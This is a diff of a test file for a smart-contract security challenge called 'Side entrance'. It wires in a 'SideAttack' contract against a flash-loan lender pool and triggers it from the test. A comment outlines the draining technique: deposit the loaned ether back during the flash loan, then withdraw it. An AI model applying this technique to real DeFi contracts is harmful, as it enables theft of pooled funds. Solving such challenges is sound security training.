@@ -12,7 +12,9 @@ describe('[Challenge] Side entrance', function () {
         [deployer, attacker] = await ethers.getSigners();
 
         const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
+        const SideAttackFactory = await ethers.getContractFactory('SideAttack',deployer);
         this.pool = await SideEntranceLenderPoolFactory.deploy();
+        this.attackerContract = await SideAttackFactory.deploy(this.pool.address,attacker.address);
         
         await this.pool.deposit({ value: ETHER_IN_POOL });
 
@@ -25,6 +27,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //execute calls deposit then withdraw during the flashLoan
+        //everything happens at constructor, so exploit will pass without a problem.
+        this.attackerContract.connect(attacker).attack();
+
     });
 
     after(async function () {
